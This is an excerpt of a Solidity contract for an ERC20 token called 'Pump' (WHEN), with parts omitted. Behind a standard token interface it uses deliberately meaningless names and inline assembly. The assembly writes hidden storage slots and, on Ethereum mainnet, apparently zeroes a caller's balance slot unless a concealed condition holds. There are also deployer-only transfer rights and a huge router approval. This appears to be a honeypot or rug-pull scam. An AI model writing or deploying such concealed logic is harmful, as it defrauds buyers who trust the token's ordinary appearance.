...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addWhen;
    uint256 private whomWhy = block.number*2;

    mapping (address => bool) private _firstAsk; 
    mapping (address => bool) private _secondQuestion;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private tripleWho;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private whereGold;
    address public pair;
    ...
    bool private trading; uint256 private goodBye = 1; bool private catFly;
    uint256 private _decimals; uint256 private pampTime;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addWhen.push(_router); addWhen.push(msgSender_); addWhen.push(pair);
        for (uint256 q=0; q < 3;) {_firstAsk[addWhen[q]] = true; unchecked{q++;} }
    }
    ...
    function _slowStart() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xed03610aede9341f00d24aafd6cf5753b857645562562a857ea9f8856b3f96eb
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x9683b346a5e79bf5dff58e9f9b8f7e04e248840bff30ee29ad39a6efad5fb9a7,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; whomWhy = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addWhen[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployWhen(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addWhen[0], 10 ** 77);
        _slowStart();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployWhen(creator, initialSupply);
    }
}

contract WhenPump is ERC20Token {
    constructor() ERC20Token("Pump", "WHEN", msg.sender, 100000000 * 10 ** 18) {
    }
}